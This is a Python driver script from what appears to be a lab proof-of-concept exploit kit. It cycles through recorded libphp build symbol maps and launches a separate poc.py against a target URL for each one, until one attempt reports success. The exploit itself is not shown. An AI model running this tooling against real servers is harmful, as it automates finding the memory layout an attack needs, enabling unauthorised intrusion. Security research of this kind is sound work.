#!/usr/bin/env python3
"""Try recorded libphp symbol maps against one explicitly selected lab layout."""

from __future__ import annotations

import argparse
import json
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--profile-id", required=True)
    parser.add_argument(
        "--build-id",
        action="append",
        default=[],
        help="candidate build; repeat to control order",
    )
    parser.add_argument(
        "--all-builds",
        action="store_true",
        help="try every official build with a visible PHP fingerprint",
    )
    parser.add_argument("--retries", type=int, default=3)
    parser.add_argument(
        "--profiles-file", type=Path, default=ROOT / "profiles.json"
    )
    args, forwarded = parser.parse_known_args()

    registry = json.loads(args.profiles_file.read_text(encoding="utf-8"))
    builds = registry.get("builds", {})
    if not isinstance(builds, dict):
        raise RuntimeError("invalid build registry")

    candidate_ids = list(args.build_id)
    if args.all_builds:
        candidate_ids.extend(
            build_id
            for build_id, mapping in builds.items()
            if build_id.startswith("official-php-") and mapping.get("php_header")
        )
    candidate_ids = list(dict.fromkeys(candidate_ids))
    if not candidate_ids:
        parser.error("select at least one --build-id or use --all-builds")
    unknown = [build_id for build_id in candidate_ids if build_id not in builds]
    if unknown:
        parser.error(f"unknown build id(s): {', '.join(unknown)}")

    for index, build_id in enumerate(candidate_ids, 1):
        print(
            f"\n=== candidate {index}/{len(candidate_ids)}: {build_id} ===",
            flush=True,
        )
        command = [
            sys.executable,
            str(ROOT / "poc.py"),
            "--url",
            args.url,
            "--profiles-file",
            str(args.profiles_file),
            "--profile-id",
            args.profile_id,
            "--build-id",
            build_id,
            "--retries",
            str(args.retries),
            *forwarded,
        ]
        result = subprocess.run(command, check=False)
        if result.returncode == 0:
            print(f"CANDIDATE_PROOF: {build_id}")
            return 0
        print(f"CANDIDATE_FAILED: {build_id} exit={result.returncode}", flush=True)

    print("NO_CANDIDATE_PRODUCED_PROOF", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
